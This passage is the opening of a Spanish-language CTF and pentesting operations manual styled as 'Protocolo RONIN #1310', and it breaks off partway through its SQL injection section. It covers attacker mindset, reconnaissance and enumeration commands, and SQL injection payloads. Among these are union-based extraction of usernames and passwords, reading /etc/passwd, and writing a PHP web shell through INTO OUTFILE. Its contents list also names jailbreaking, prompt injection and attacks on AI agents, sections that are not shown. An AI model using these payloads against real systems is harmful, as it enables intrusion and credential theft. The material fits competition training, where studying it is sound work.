# 🏴 AGENTE CTF: MANUAL OPERATIVO COMPLETO DE CIBERSEGURIDAD DE COMPETICIÓN
## Edición Definitiva v3.0 — Agosto 2026
### Protocolo RONIN #1310 | Clasificación: USO EN COMPETICIÓN AUTORIZADA

---

```
╔══════════════════════════════════════════════════════════════════════╗
║  ██████╗████████╗███████╗   ██████╗ ██████╗ ███╗   ███╗███████╗  ║
║ ██╔════╝╚══██╔══╝██╔════╝  ██╔════╝██╔═══██╗████╗ ████║██╔════╝  ║
║ ██║        ██║   █████╗    ██║     ██║   ██║██╔████╔██║█████╗    ║
║ ██║        ██║   ██╔══╝    ██║     ██║   ██║██║╚██╔╝██║██╔══╝    ║
║ ╚██████╗   ██║   ██║       ╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗  ║
║  ╚═════╝   ╚═╝   ╚═╝        ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝  ║
║                                                                    ║
║         MANUAL OPERATIVO DEL AGENTE DE CIBERSEGURIDAD              ║
║              COMPETICIÓN CTF / PENTEST / RED TEAM                  ║
║                                                                    ║
║  "El conocimiento que no se ejecuta es decoración." — #1310       ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## TABLA DE CONTENIDOS MAESTRA

- [PARTE I: FUNDAMENTOS DEL AGENTE](#parte-i)
  - [1.1 Filosofía Operativa](#11)
  - [1.2 Metodología PTES Adaptada a CTF](#12)
  - [1.3 Mentalidad del Atacante](#13)
  - [1.4 Gestión del Tiempo en Competición](#14)
- [PARTE II: RECONOCIMIENTO Y ENUMERACIÓN](#parte-ii)
  - [2.1 OSINT y Huella Digital](#21)
  - [2.2 Escaneo de Red y Servicios](#22)
  - [2.3 Fuzzing Web y Descubrimiento de Endpoints](#23)
  - [2.4 Fingerprinting de Tecnologías](#24)
  - [2.5 Enumeración de Directorios y Archivos](#25)
- [PARTE III: VULNERABILIDADES DE INYECCIÓN](#parte-iii)
  - [3.1 SQL Injection (SQLi)](#31)
  - [3.2 NoSQL Injection](#32)
  - [3.3 Command Injection (OS)](#33)
  - [3.4 LDAP Injection](#34)
  - [3.5 XPath Injection](#35)
  - [3.6 SSTI (Server-Side Template Injection)](#36)
  - [3.7 XXE (XML External Entity)](#37)
  - [3.8 SSRF (Server-Side Request Forgery)](#38)
- [PARTE IV: CROSS-SITE SCRIPTING (XSS)](#parte-iv)
  - [4.1 Reflected XSS](#41)
  - [4.2 Stored XSS](#42)
  - [4.3 DOM-based XSS](#43)
  - [4.4 Blind XSS](#44)
  - [4.5 Bypass de Filtros WAF](#45)
  - [4.6 XSS en Contextos Específicos](#46)
- [PARTE V: AUTENTICACIÓN Y SESIONES](#parte-v)
  - [5.1 Broken Authentication](#51)
  - [5.2 JWT Vulnerabilities](#52)
  - [5.3 Session Management](#53)
  - [5.4 OAuth y SSO](#54)
  - [5.5 CSRF](#55)
  - [5.6 MFA Bypass](#56)
- [PARTE VI: CONTROL DE ACCESO](#parte-vi)
  - [6.1 IDOR](#61)
  - [6.2 Path Traversal / LFI / RFI](#62)
  - [6.3 Privilege Escalation (Linux)](#63)
  - [6.4 Privilege Escalation (Windows)](#64)
  - [6.5 Broken Access Control Patterns](#65)
- [PARTE VII: CRIPTOGRAFÍA Y HASHING](#parte-vii)
  - [7.1 Weak Hashing](#71)
  - [7.2 Padding Oracle Attack](#72)
  - [7.3 RSA Vulnerabilities](#73)
  - [7.4 Hash Length Extension](#74)
  - [7.5 AES y Modos de Operación](#75)
  - [7.6 Codificaciones y Esteganografía Criptográfica](#76)
  - [7.7 Herramientas de Criptoanálisis](#77)
- [PARTE VIII: EXPLOTACIÓN DE BINARIOS](#parte-viii)
  - [8.1 Buffer Overflow (Stack)](#81)
  - [8.2 Format String Vulnerability](#82)
  - [8.3 Use After Free (Heap)](#83)
  - [8.4 ROP Chains](#84)
  - [8.5 Bypass de Protecciones](#85)
  - [8.6 Reverse Engineering](#86)
  - [8.7 Shellcoding](#87)
- [PARTE IX: FORENSE DIGITAL](#parte-ix)
  - [9.1 Análisis de Archivos](#91)
  - [9.2 Esteganografía](#92)
  - [9.3 Análisis de Memoria RAM](#93)
  - [9.4 Análisis de Red (PCAP)](#94)
  - [9.5 Análisis de Disco](#95)
  - [9.6 Malware Analysis](#96)
- [PARTE X: SEGURIDAD EN CLOUD Y CONTENEDORES](#parte-x)
  - [10.1 Docker Security](#101)
  - [10.2 Kubernetes Exploitation](#102)
  - [10.3 AWS Misconfigurations](#103)
  - [10.4 Container Escape](#104)
  - [10.5 Serverless Security](#105)
- [PARTE XI: SEGURIDAD EN IA/LLM](#parte-xi)
  - [11.1 Prompt Injection](#111)
  - [11.2 Jailbreaking](#112)
  - [11.3 Hacking Ontológico](#113)
  - [11.4 Ataques a Agentes Autónomos](#114)
  - [11.5 Data Poisoning y Model Extraction](#115)
- [PARTE XII: INGENIERÍA SOCIAL Y FÍSICA](#parte-xii)
  - [12.1 Phishing y Spear Phishing](#121)
  - [12.2 Vishing y Pretexting](#122)
  - [12.3 Acceso Físico](#123)
  - [12.4 Manipulación Psicológica](#124)
- [PARTE XIII: HERRAMIENTAS Y ARSENAL](#parte-xiii)
  - [13.1 Reconocimiento](#131)
  - [13.2 Explotación Web](#132)
  - [13.3 Explotación de Red](#133)
  - [13.4 Explotación de Binarios](#134)
  - [13.5 Forense](#135)
  - [13.6 Criptografía](#136)
  - [13.7 Cloud y Contenedores](#137)
- [PARTE XIV: AUTOMATIZACIÓN Y SCRIPTING](#parte-xiv)
  - [14.1 Bash para CTF](#141)
  - [14.2 Python para Explotación](#142)
  - [14.3 Pwntools en Profundidad](#143)
  - [14.4 Automatización con Burp Suite](#144)
- [PARTE XV: ESTRATEGIA DE COMPETICIÓN](#parte-xv)
  - [15.1 Triaje de Retos](#151)
  - [15.2 Gestión de Equipo](#152)
  - [15.3 Write-up y Documentación](#153)
  - [15.4 Psicología del Competidor](#154)
- [PARTE XVI: CHECKLISTS OPERATIVOS](#parte-xvi)
- [PARTE XVII: PAYLOAD LIBRARY](#parte-xvii)
- [PARTE XVIII: REFERENCIAS Y RECURSOS](#parte-xviii)
- [PARTE XIX: GLOSARIO COMPLETO](#parte-xix)
- [PARTE XX: APÉNDICES TÉCNICOS](#parte-xx)

---

<a name="parte-i"></a>
# PARTE I: FUNDAMENTOS DEL AGENTE CTF

---

<a name="11"></a>
## 1.1 FILOSOFÍA OPERATIVA DEL AGENTE

### 1.1.1 Principios Fundamentales

El agente de competición CTF opera bajo una filosofía que combina el rigor técnico con la creatividad táctica. No es suficiente conocer las herramientas; es necesario comprender los mecanismos subyacentes que hacen posible cada vulnerabilidad.

**Los Diez Principios del Agente CTF:**

| # | Principio | Descripción |
|---|-----------|-------------|
| 1 | **Presunción de vulnerabilidad** | Todo sistema tiene un punto débil. El trabajo es encontrarlo antes que el tiempo se agote. |
| 2 | **Enumerar antes de explotar** | La información es munición. Nunca atacar sin un mapa completo de la superficie. |
| 3 | **El input es el arma** | Cada campo, cada parámetro, cada header es un vector potencial. |
| 4 | **Pensar como el desarrollador** | Los errores más explotables son los que el desarrollador no anticipó. |
| 5 | **Automatizar lo repetitivo** | El tiempo en competición es finito. Lo que se hace más de dos veces, se scriptea. |
| 6 | **Documentar en tiempo real** | Un hallazgo no documentado es un hallazgo perdido. |
| 7 | **Escalar con método** | De foothold a root hay un camino. Cada paso debe ser deliberado. |
| 8 | **El contexto es la clave** | Un payload genérico rara vez funciona. La adaptación al contexto específico es lo que diferencia al novicio del experto. |
| 9 | **Fallar rápido, aprender más rápido** | En CTF, un intento fallido que descarta un vector vale más que diez minutos de especulación. |
| 10 | **La flag es el objetivo, no el exploit** | No se trata de demostrar habilidad técnica, sino de capturar la flag. Pragmatismo sobre purismo. |

### 1.1.2 El Modelo Mental del Atacante

```
┌─────────────────────────────────────────────────────────────────┐
│                    CICLO DE PENSAMIENTO OFENSIVO                 │
│                                                                 │
│   OBSERVAR ──► ORIENTAR ──► DECIDIR ──► ACTUAR                 │
│      │              │            │           │                   │
│      ▼              ▼            ▼           ▼                   │
│  Enumerar       Analizar     Elegir      Ejecutar               │
│  servicios      vectores     vector      payload                │
│  mapear         priorizar    óptimo      adaptar                │
│  superficie     riesgos      (coste/     al contexto            │
│  de ataque      reales       impacto)    específico             │
│                                                                 │
│   ◄──────────────── FEEDBACK ──────────────────────►            │
│   (Si falla: volver a OBSERVAR con nueva información)          │
└─────────────────────────────────────────────────────────────────┘
```

### 1.1.3 La Diferencia entre Conocimiento y Ejecución

> *"El conocimiento que no se ejecuta es decoración." — Protocolo #1310*

En competición CTF, la diferencia entre un equipo que resuelve 3 retos y uno que resuelve 15 no es el conocimiento teórico. Es la velocidad de traducción entre:

1. **Reconocimiento del patrón** → "Esto parece una inyección SQL"
2. **Selección del vector** → "Es blind SQLi time-based"
3. **Construcción del payload** → `' AND SLEEP(5)--`
4. **Adaptación al contexto** → Ajustar según WAF, encoding, DBMS específico
5. **Extracción del dato** → Automatizar la extracción carácter a carácter

### 1.1.4 Taxonomía de Retos CTF

| Categoría | Abreviatura | Descripción | Frecuencia |
|-----------|-------------|-------------|------------|
| Web Exploitation | Web | Vulnerabilidades en aplicaciones web | ★★★★★ |
| Binary Exploitation / Pwn | Pwn | Explotación de vulnerabilidades en binarios | ★★★★☆ |
| Cryptography | Crypto | Desafíos criptográficos y matemáticos | ★★★★☆ |
| Reverse Engineering | Rev | Análisis inverso de binarios y malware | ★★★★☆ |
| Forensics | Forensics | Análisis de archivos, memoria, red | ★★★★☆ |
| OSINT | OSINT | Inteligencia de fuentes abiertas | ★★★☆☆ |
| Steganography | Stego | Ocultamiento de información en multimedia | ★★★☆☆ |
| Miscellaneous | Misc | Todo lo demás (programación, lógica, etc.) | ★★☆☆☆ |
| Hardware/IoT | HW | Seguridad en dispositivos embebidos | ★★☆☆☆ |
| Mobile | Mobile | Seguridad en aplicaciones Android/iOS | ★★☆☆☆ |
| Cloud | Cloud | Seguridad en AWS, Azure, GCP, K8s | ★★★☆☆ |
| AI/ML Security | AI | Ataques a modelos de IA | ★★☆☆☆ |

---

<a name="12"></a>
## 1.2 METODOLOGÍA PTES ADAPTADA A CTF

### 1.2.1 Fases del Pentesting (PTES) en Contexto CTF

El Penetration Testing Execution Standard (PTES) define siete fases. En CTF, estas fases se comprimen y adaptan:

```
FASE 1: PRE-ENGAGEMENT (en CTF: lectura del enunciado)
│  ├── Leer el enunciado COMPLETO antes de tocar nada
│  ├── Identificar el tipo de reto (web, pwn, crypto, forensics...)
│  ├── Identificar la flag format esperada (CTF{...}, FLAG{...}, etc.)
│  └── Estimar dificultad y asignar tiempo máximo
│
FASE 2: INTELLIGENCE GATHERING (en CTF: reconocimiento)
│  ├── OSINT si aplica (dominios, whois, certificados SSL)
│  ├── Escaneo de puertos y servicios
│  ├── Fingerprinting de tecnologías
│  ├── Análisis del código fuente si está disponible
│  └── Identificación de la superficie de ataque
│
FASE 3: THREAT MODELING (en CTF: hipótesis de vulnerabilidad)
│  ├── ¿Qué vulnerabilidad es más probable dado el stack tecnológico?
│  ├── ¿Qué pistas da el enunciado?
│  ├── ¿Qué CVEs aplican a las versiones detectadas?
│  └── ¿Hay algún "tema" del reto que sugiera el vector?
│
FASE 4: VULNERABILITY ANALYSIS (en CTF: pruebas dirigidas)
│  ├── Testing manual de vectores identificados
│  ├── Fuzzing dirigido (no aleatorio)
│  ├── Análisis de respuestas del servidor
│  └── Confirmación de la vulnerabilidad
│
FASE 5: EXPLOITATION (en CTF: captura de la flag)
│  ├── Construcción del exploit
│  ├── Ejecución y captura de la flag
│  ├── Verificación del formato de la flag
│  └── Envío de la flag
│
FASE 6: POST-EXPLOITATION (en CTF: escalada si es necesario)
│  ├── Si hay múltiples flags, escalar privilegios
│  ├── Buscar flags adicionales en el sistema
│  └── Documentar el camino completo
│
FASE 7: REPORTING (en CTF: write-up)
│  ├── Documentar la solución para el equipo
│  ├── Compartir hallazgos con compañeros
│  └── Publicar write-up post-competición
```

### 1.2.2 Tiempo por Fase según Dificultad del Reto

| Dificultad | Reconocimiento | Análisis | Explotación | Total estimado |
|------------|---------------|----------|-------------|----------------|
| Easy (100-200 pts) | 5-10 min | 5-10 min | 5-15 min | 15-35 min |
| Medium (300-500 pts) | 10-20 min | 20-40 min | 20-40 min | 50-100 min |
| Hard (600-800 pts) | 15-30 min | 30-60 min | 30-90 min | 75-180 min |
| Insane (900-1000 pts) | 20-40 min | 60-120 min | 60-180 min | 140-340 min |

### 1.2.3 Regla del 15 Minutos

**Si llevas 15 minutos en un vector sin progreso medible, CAMBIA DE VECTOR.**

Excepciones:
- Estás a un paso concreto de la explotación (ej: ya tienes el offset del buffer overflow)
- El reto es de dificultad "Insane" y el enunciado sugiere complejidad extrema
- Tu compañero está trabajando en paralelo otro vector

---

<a name="13"></a>
## 1.3 MENTALIDAD DEL ATACANTE

### 1.3.1 Los Cuatro Pilares del Pensamiento Ofensivo

Basado en las lecciones de Kevin Mitnick, Peter Kim y la metodología del Manual del Adversario:

**Pilar 1: Curiosidad Obsesiva**
- No asumir que algo "no es vulnerable" porque parece seguro
- Probar inputs inesperados en cada campo
- Preguntarse siempre: "¿Qué pasa si...?"
  - ¿Qué pasa si envío un array en lugar de un string?
  - ¿Qué pasa si el parámetro es null?
  - ¿Qué pasa si cambio el método HTTP de GET a POST?
  - ¿Qué pasa si añado un header inesperado?

**Pilar 2: Paciencia Extrema**
- Los ataques multi-paso son los más efectivos
- Un ataque de blind SQLi puede requerir horas de extracción automatizada
- La enumeración exhaustiva siempre paga

**Pilar 3: Pensamiento Sistémico**
- Cada componente interactúa con otros
- Una vulnerabilidad en un microservicio puede comprometer todo el cluster
- La cadena de suministro es tan fuerte como su eslabón más débil

**Pilar 4: Adaptabilidad**
- Ningún payload funciona siempre
- El contexto (WAF, encoding, versión del servidor) determina el éxito
- La capacidad de improvisar supera a la memorización de payloads

### 1.3.2 El Modelo de Kevin Mitnick Aplicado a CTF

| Palanca | Aplicación en CTF |
|---------|-------------------|
| **Autoridad** | Headers como `X-Forwarded-For: 127.0.0.1`, cookies de admin, tokens JWT con rol elevado |
| **Urgencia** | Race conditions, TOCTOU, timing attacks |
| **Simpatía** | Parámetros que "ayudan" al servidor (debug=true, verbose=1) |
| **Miedo** | Mensajes de error que revelan información, stack traces |

### 1.3.3 Anatomía de un Ataque Exitoso (Modelo Peter Kim)

```
PRE-PARTIDO (Reconocimiento)
├── OSINT: whois, DNS, certificados, GitHub, Shodan
├── Escaneo: nmap, masscan, rustscan
├── Fingerprinting: whatweb, wappalyzer, headers HTTP
└── Superficie: gobuster, ffuf, dirsearch, parameter discovery

PRIMER TIEMPO (Explotación Inicial)
├── Inyecciones: SQLi, XSS, SSTI, XXE, Command Injection
├── Auth bypass: JWT, session fixation, default creds
├── File access: LFI, RFI, path traversal
└── Lógica de negocio: IDOR, race conditions, parameter tampering

MEDIO TIEMPO (Análisis de Posición)
├── ¿Dónde estoy? (usuario, privilegios, red)
├── ¿Qué puedo ver? (archivos, procesos, conexiones)
├── ¿Qué puedo tocar? (SUID, sudo, cron, capabilities)
└── ¿Cuál es el siguiente objetivo?

SEGUNDO TIEMPO (Post-Explotación)
├── Escalada de privilegios (vertical y horizontal)
├── Movimiento lateral (pivot a otros servicios)
├── Persistencia (si aplica al reto)
└── Extracción de la flag

POST-PARTIDO (Documentación)
├── Write-up del reto
├── Flags capturadas y validadas
└── Lecciones aprendidas para el equipo
```

---

<a name="14"></a>
## 1.4 GESTIÓN DEL TIEMPO EN COMPETICIÓN

### 1.4.1 Estrategia de Asignación Temporal

En una competición de 24 horas con un equipo de 4-6 personas:

```
HORA 0-1:   Reconocimiento global de TODOS los retos
            - Leer todos los enunciados
            - Clasificar por categoría y dificultad estimada
            - Asignar retos a miembros del equipo según especialidad

HORA 1-6:   Resolución de retos Easy y Medium
            - Objetivo: capturar el 60% de los puntos disponibles
            - No atascarse: si un reto "Medium" lleva >45 min, aparcar

HORA 6-16:  Resolución de retos Hard
            - Trabajo colaborativo en los más difíciles
            - Pair programming en exploits complejos
            - Compartir hallazgos parciales

HORA 16-22: Resolución de retos Insane + repaso
            - Solo los retos que ya tienen progreso
            - No empezar retos nuevos sin pista

HORA 22-24: Últimos intentos + validación de flags
            - Verificar que todas las flags están enviadas
            - Últimos fuzzing/brute force automatizados
```

### 1.4.2 Reglas de Oro del Tiempo

1. **Nunca trabajar en un reto sin haber leído el enunciado dos veces.** La mayoría de pistas están en el texto.
2. **Si un compañero lleva 30 minutos atascado, ofrecer ayuda.** Fresh eyes ven cosas que el cerebro fatigado no ve.
3. **Automatizar SIEMPRE que la tarea se repita más de 3 veces.** Un script de 5 minutos ahorra 30 de trabajo manual.
4. **Comer, hidratarse, descansar.** Un cerebro fatigado comete errores que cuestan horas.
5. **No ignorar los retos de 100 puntos.** Son rápidos y dan moral al equipo.

### 1.4.3 Triaje Rápido (30 segundos por reto)

```
1. ¿Qué categoría es? → Asignar al especialista del equipo
2. ¿Qué me da el enunciado? → URL, archivo binario, pcap, código fuente
3. ¿Qué formato tiene la flag? → CTF{...}, flag{...}, base64, hex
4. ¿Hay alguna pista explícita? → "SQL", "buffer", "XOR", "PCAP"
5. ¿Qué dificultad tiene? → Puntos asignados / número de solves
```

---

<a name="parte-ii"></a>
# PARTE II: RECONOCIMIENTO Y ENUMERACIÓN

---

<a name="21"></a>
## 2.1 OSINT Y HUELLA DIGITAL

### 2.1.1 Técnicas de Reconocimiento Pasivo

```bash
# WHOIS - Información de registro de dominio
whois target.com
whois -h whois.cymru.com " -v 8.8.8.8"  # IP ownership

# DNS Enumeration
dig target.com ANY
dig target.com MX
dig target.com TXT
dig target.com NS
dig axfr @ns1.target.com target.com  # Zone transfer
dnsrecon -d target.com -t axfr
dnsenum target.com
fierce --domain target.com

# Subdominios
subfinder -d target.com -o subs.txt
amass enum -d target.com
assetfinder --subs-only target.com
crt.sh | grep target.com  # Certificate transparency logs

# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com ext:log
site:target.com "password" OR "credential"
intitle:"index of" site:target.com

# Wayback Machine
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sort -u

# GitHub Dorking
# Buscar repositorios, keys, configs expuestas
github.com/search?q=target.com+password
github.com/search?q=target.com+api_key
# Herramienta: trufflehog, git-secrets, gitleaks

# Shodan / Censys
shodan search "hostname:target.com"
shodan search "ssl.cert.subject.CN:target.com"
curl "https://api.shodan.io/shodan/host/8.8.8.8?key=API_KEY"

# theHarvester (recolección multi-fuente)
theHarvester -d target.com -b all -l 500
```

### 2.1.2 Reconocimiento Activo Controlado

```bash
# Identificación de tecnologías web
whatweb http://target.com
wafw00f http://target.com  # Detección de WAF

# Headers HTTP informativos
curl -I http://target.com
curl -s http://target.com | grep -i "x-powered-by\|server\|x-frame"

# robots.txt y archivos comunes
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml
curl http://target.com/.git/config
curl http://target.com/.env
curl http://target.com/.htaccess
curl http://target.com/wp-login.php
curl http://target.com/admin/
curl http://target.com/phpinfo.php
curl http://target.com/server-status

# SSL/TLS Analysis
openssl s_client -connect target.com:443 -servername target.com
sslscan target.com
testssl.sh target.com

# Fingerprinting de frameworks
# Django: /admin/, CSRF tokens con 'csrfmiddlewaretoken'
# Flask: /static/, error pages con traceback
# Rails: /assets/, CSRF tokens con 'authenticity_token'
# Express: X-Powered-By: Express
# ASP.NET: X-AspNet-Version, .aspx extensions
```

### 2.1.3 Enumeración de Redes Sociales y Personas

```bash
# Para retos OSINT
# LinkedIn: empleados, tecnologías usadas, proyectos
# Twitter/X: anuncios, tecnologías, incidentes
# GitHub: código fuente, issues, commits
# Stack Overflow: preguntas técnicas del equipo
# Pastebin: leaks, configuraciones expuestas

# Herramientas específicas
sherlock username  # Buscar username en múltiples plataformas
holehe email@example.com  # Verificar registro en servicios
maigret username  # OSINT de username
social-analyzer --username "target" --platforms all
```

---

<a name="22"></a>
## 2.2 ESCANEO DE RED Y SERVICIOS

### 2.2.1 Nmap: El Estándar de Facto

```bash
# Escaneo rápido (primera pasada)
nmap -sV -sC -p- --min-rate 10000 target

# Escaneo completo con scripts y detección de versión
nmap -sV -sC -O -p- -A target -oN full_scan.txt

# Escaneo UDP (a menudo olvidado)
nmap -sU --top-ports 100 target

# Escaneo de scripts específicos
nmap --script=vuln target
nmap --script=http-enum target
nmap --script=ssh-run --script-args ssh-run.cmd='cat /etc/passwd' target

# Escaneo de servicios específicos
nmap -p 80 --script=http-sql-injection target
nmap -p 3306 --script=mysql-empty-password target
nmap -p 21 --script=ftp-anon target
nmap -p 445 --script=smb-enum-shares,smb-enum-users target

# Escaneo stealth (evitar IDS)
nmap -sS -T2 -f --data-length 24 target
nmap -D RND:10 target  # Decoys

# Output en todos los formatos
nmap -oN normal.txt -oX scan.xml -oG grep.txt target
```

### 2.2.2 Masscan y Rustscan (Velocidad)

```bash
# Masscan: escaneo ultrarrápido de todos los puertos
masscan -p1-65535 target --rate=10000 -oJ masscan.json

# Rustscan: escaneo rápido + nmap automático
rustscan -a target -- -sV -sC

# Escaneo de subredes completas
nmap -sn 10.10.10.0/24  # Ping sweep
masscan 10.10.10.0/24 -p80,443,8080 --rate=5000
```

### 2.2.3 Enumeración de Servicios Específicos

```bash
# SSH
ssh-audit target
nmap -p 22 --script=ssh2-enum-algos target

# HTTP/HTTPS
nikto -h http://target
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak
ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302,403
dirsearch -u http://target -e php,html,js,txt

# SMB
enum4linux -a target
smbclient -L //target -N
crackmapexec smb target --shares --users

# FTP
ftp target  # anonymous login
nmap -p 21 --script=ftp-anon target

# SNMP
snmpwalk -v2c -c public target
snmp-check target

# LDAP
ldapsearch -x -H ldap://target -b '' -s base '(objectclass=*)'
nmap -p 389 --script=ldap-search target

# Redis
redis-cli -h target INFO
nmap -p 6379 --script=redis-info target

# MySQL/PostgreSQL
nmap -p 3306 --script=mysql-enum target
nmap -p 5432 --script=pgsql-info target

# Elasticsearch
curl http://target:9200/_cat/indices
curl http://target:9200/_cluster/health

# Docker API
curl http://target:2375/version
curl http://target:2375/containers/json

# Kubernetes API
curl -k https://target:6443/api/v1/namespaces
curl -k https://target:8080/api/v1/pods
```

---

<a name="23"></a>
## 2.3 FUZZING WEB Y DESCUBRIMIENTO DE ENDPOINTS

### 2.3.1 Fuzzing de Directorios

```bash
# Gobuster (rápido, Go)
gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,html,txt,bak,old,conf,log
gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100

# FFUF (flexible, filtrado)
ffuf -u http://target/FUZZ -w wordlist.txt -mc 200 -fc 404 -fs 1234
ffuf -u http://target/FUZZ -w wordlist.txt -recursion -recursion-depth 3
ffuf -u http://target/api/FUZZ -w api_endpoints.txt -H "Authorization: Bearer TOKEN"

# Dirsearch (Python, multi-extensión)
dirsearch -u http://target -e php,asp,aspx,jsp,html,js -x 403,404 -t 50

# Feroxbuster (Rust, muy rápido)
feroxbuster -u http://target -w wordlist.txt -x php,html,txt -n --silent
```

### 2.3.2 Fuzzing de Parámetros

```bash
# Descubrir parámetros ocultos
ffuf -u "http://target/page?FUZZ=test" -w params.txt -mc 200 -fs 0
arachni http://target  # Scanner automatizado

# Parámetros comunes para fuzzing
id, user, username, name, email, password, pass, pwd
file, filename, path, dir, page, template, include
url, redirect, next, return, callback, dest
cmd, command, exec, run, query, search
data, input, value, content, body, payload
token, key, api_key, secret, auth, session
debug, test, admin, verbose, trace, log
```

### 2.3.3 Fuzzing de Subdominios y VHosts

```bash
# Subdominios
subfinder -d target.com | httpx -silent | tee live_subs.txt
knockpy target.com
gobuster dns -d target.com -w subdomains.txt

# Virtual Hosts
ffuf -u http://target -H "Host: FUZZ.target.com" -w vhosts.txt -mc 200 -fs 1234
gobuster vhost -u http://target -w vhosts.txt
```

### 2.3.4 Wordlists Esenciales

```bash
# Ubicación de wordlists en Kali/Parrot
/usr/share/wordlists/
/usr/share/seclists/
/usr/share/dirbuster/

# Wordlists críticas para CTF:
# - common.txt (directorios básicos)
# - directory-list-2.3-medium.txt (220k entradas)
# - raft-large-files.txt (archivos)
# - api_endpoints.txt (APIs REST)
# - params.txt (parámetros GET/POST)
# - passwords/rockyou.txt (contraseñas)
# - Discovery/DNS/subdomains-top1million-110000.txt

# Generar wordlist personalizada
crunch 8 12 -t @@@@%%%% -o custom.txt
cewl http://target.com -m 5 -w target_words.txt
```

---

<a name="24"></a>
## 2.4 FINGERPRINTING DE TECNOLOGÍAS

### 2.4.1 Identificación de Stack Tecnológico

```bash
# WhatWeb (detección de CMS, frameworks, servidores)
whatweb -a 3 http://target

# Wappalyzer (CLI)
wappalyzer http://target

# Headers reveladores
curl -sI http://target | grep -iE "server|x-powered|x-aspnet|x-generator|x-drupal"

# Archivos específicos de frameworks
# WordPress: /wp-content/, /wp-includes/, /xmlrpc.php
# Drupal: /sites/default/, /user/login
# Joomla: /administrator/, /components/
# Laravel: /storage/, .env con APP_KEY
# Django: /admin/, /static/admin/
# Spring Boot: /actuator, /actuator/env, /actuator/health
# Node/Express: X-Powered-By: Express
# ASP.NET: web.config, .aspx, __VIEWSTATE

# Detección de CMS
droopescan scan wordpress -u http://target
droopescan scan drupal -u http://target
joomscan -u http://target
```

### 2.4.2 Detección de WAF

```bash
# WAFW00F
wafw00f http://target

# Detección manual
curl -s "http://target/?id=1' OR '1'='1" | grep -i "blocked\|denied\|forbidden\|waf"
curl -s "http://target/<script>alert(1)</script>" | grep -i "blocked"

# WAFs comunes:
# - Cloudflare: cf-ray header, __cfduid cookie
# - AWS WAF: x-amzn-requestid
# - ModSecurity: "403 Forbidden" con ModSecurity message
# - Akamai: x-akamai-transformed
# - Imperva/Incapsula: visid_incap, incap_ses cookies
```

---

<a name="25"></a>
## 2.5 ENUMERACIÓN DE DIRECTORIOS Y ARCHIVOS

### 2.5.1 Archivos de Interés en Servidores Web

```bash
# Archivos de configuración
/.env
/.git/config
/.git/HEAD
/.svn/entries
/.DS_Store
/web.config
/config.php
/config.yaml
/application.properties
/application.yml

# Backups y temporales
/backup.zip
/db.sql
/database.sql.bak
/site.tar.gz
/www.zip
/old/
/bak/
/temp/

# Logs y debug
/logs/
/debug/
/phpinfo.php
/info.php
/server-status
/server-info
/trace.axd

# APIs y documentación
/api/
/swagger.json
/openapi.json
/api-docs
/graphql
/graphiql

# Archivos de deployment
/Dockerfile
/docker-compose.yml
/.dockerignore
/Jenkinsfile
/.gitlab-ci.yml
/.github/workflows/
```

### 2.5.2 Enumeración de Git Expuesto

```bash
# Si .git está accesible
git-dumper http://target/.git/ ./git_dump/
cd git_dump && git log --all --oneline
git show HEAD:secret_file.txt
git stash list
git reflog  # Ver commits borrados

# Herramienta automatizada
git-dumper http://target/.git/ output/
```

---

<a name="parte-iii"></a>
# PARTE III: VULNERABILIDADES DE INYECCIÓN

---

<a name="31"></a>
## 3.1 SQL INJECTION (SQLi)

### 3.1.1 Fundamentos

**CWE:** CWE-89 | **CVSS Máximo:** 10.0 (Crítico)

La inyección SQL permite interferir con las consultas que una aplicación realiza a su base de datos. Es uno de los vectores más comunes y peligrosos en CTF.

### 3.1.2 Tipos de SQL Injection

| Tipo | Descripción | Detección |
|------|-------------|-----------|
| **In-band (Classic)** | Error-based, Union-based | Errores visibles, datos en respuesta |
| **Blind (Inferential)** | Boolean-based, Time-based | Sin output directo; inferir por comportamiento |
| **Out-of-band** | DNS, HTTP requests | Datos exfiltrados por canal alternativo |
| **Second-order** | Payload almacenado y ejecutado después | Dificultad alta; requiere dos pasos |

### 3.1.3 Detección Manual

```
# Payloads de detección básicos
'
"
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
" OR "1"="1
') OR ('1'='1
1' ORDER BY 1--
1' ORDER BY 10--  # Encontrar número de columnas
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
1 UNION SELECT NULL,NULL,NULL--

# Detección de DBMS
' AND @@version--          # MySQL/MSSQL
' AND version()--          # PostgreSQL
' AND banner FROM v$version--  # Oracle
' AND sqlite_version()--   # SQLite

# Detección de WAF/bypass
' OR 1=1--
' OR 1=1#
'/**/OR/**/1=1--
'%0aOR%0a1=1--
' oR 1=1--  (case variation)
```

### 3.1.4 Union-Based SQLi

```sql
-- Paso 1: Encontrar número de columnas
' ORDER BY 1-- → OK
' ORDER BY 2-- → OK
' ORDER BY 3-- → OK
' ORDER BY 4-- → ERROR (3 columnas)

-- Paso 2: Encontrar columnas visibles
' UNION SELECT 1,2,3--

-- Paso 3: Extraer información
' UNION SELECT 1,username,password FROM users--
' UNION SELECT 1,table_name,NULL FROM information_schema.tables--
' UNION SELECT 1,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--

-- Paso 4: Leer archivos (MySQL)
' UNION SELECT 1,load_file('/etc/passwd'),3--

-- Paso 5: Escribir archivos (MySQL, requiere FILE privilege)
' UNION SELECT "<?php system($_GET['cmd']);?>",2,3 INTO OUTFILE '/var/www/html/shell.php'--
```

### 3.1.5 Error-Based SQLi

```sql
-- MySQL
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--

-- MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--

-- Oracle
